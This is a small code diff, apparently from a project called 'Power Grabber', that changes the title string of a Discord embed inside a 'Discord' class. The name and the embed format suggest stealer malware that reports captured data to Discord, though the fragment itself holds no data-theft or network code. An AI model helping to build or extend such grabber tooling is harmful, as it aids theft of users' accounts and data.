@@ -233,7 +233,7 @@ class Discord:
             data = {
                 "embeds": [
                     {
-                        "title": "//POWER GRABBER//",
+                        "title": "((✨POWER GRABBER✨))",
                         "username": "Power Grabber",
                         "color": 0x8B0000,
                         "fields": [
